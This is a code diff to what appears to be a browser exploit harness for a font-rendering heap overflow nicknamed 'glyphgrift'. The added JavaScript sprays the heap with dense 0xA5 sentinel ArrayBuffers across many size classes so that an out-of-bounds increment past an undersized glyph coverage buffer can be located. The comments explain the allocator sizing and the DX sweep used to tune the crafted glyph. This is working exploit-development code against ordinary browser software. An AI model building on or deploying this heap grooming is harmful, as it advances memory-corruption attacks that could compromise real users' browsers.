@@ -12,6 +12,26 @@
   var TARGET_SIZE = 128;
   var API = '/api/glyphgrift-heap-ready';
 
+  /* Phase 4+8: sentinel canary. A DENSE (no-hole) spray of a unique 0xA5
+     pattern, kept alive across the trigger. If the OOB 16-bit increment
+     overflows past the undersized coverage buffer into a sentinel slot, the
+     post-trigger scan flags the EXACT offset + before(0xA5)/after value.
+
+     SIZING (the bug we were missing): the coverage buffer is
+     4*(width_px+16) bytes, and the crafted glyph reaches ~1M device pixels wide,
+     so on a HEAP OOB (DX>=32 -> malloc) the coverage allocation is in the
+     KILOBYTE range (a large bmalloc size class), not the 48-256B small-object
+     buckets. A canary only in the small buckets can never be physically
+     adjacent to a KB-scale coverage buffer, so the increment would land in an
+     allocation we do not observe. We therefore densely cover the small buckets
+     AND the KB-scale large-object classes the coverage buffer is most likely to
+     land in, so a neighboring canary catches the overflow regardless of the
+     (bbox-broken) size. DX sweep 33-40 varies the broken width_px -> coverage
+     size, so spanning the classes hedges the empirical outcome. */
+  var SENTINEL_SIZES = [64, 96, 128, 160, 256, 512, 1024, 2048, 4096, 8192];
+  var SENTINEL_PER = 256;
+  var SENTINEL_BYTE = 0xa5;
+
   function fillPattern(buf, marker) {
     var u8 = new Uint8Array(buf);
     for (var i = 0; i < u8.length; i++) {
@@ -36,6 +56,7 @@
   function clearSprays() {
     window.__L0FCK_GLYPHGRIFT_SPRAYS = null;
     window.__L0FCK_GLYPHGRIFT_SPRAY = null;
+    window.__L0FCK_GLYPHGRIFT_SENTINELS = null;
     forceGC();
   }
 
@@ -65,6 +86,24 @@
       }
       sprays[size] = arr;
     }
+
+    /* Phase 4: dense 0xA5 sentinel canary — no holes, unique pattern. */
+    var sentinels = {};
+    var totalSentinels = 0;
+    for (var s = 0; s < SENTINEL_SIZES.length; s++) {
+      var ss = SENTINEL_SIZES[s];
+      var sarr = [];
+      for (var si = 0; si < SENTINEL_PER; si++) {
+        var sb = new ArrayBuffer(ss);
+        var su8 = new Uint8Array(sb);
+        for (var soff = 0; soff < su8.length; soff++) su8[soff] = SENTINEL_BYTE;
+        sarr[si] = sb;
+        totalSentinels++;
+      }
+      sentinels[ss] = sarr;
+    }
+    window.__L0FCK_GLYPHGRIFT_SENTINELS = sentinels;
+    window.__L0FCK_GLYPHGRIFT_SENTINEL_BYTE = SENTINEL_BYTE;
 
     forceGC();
 
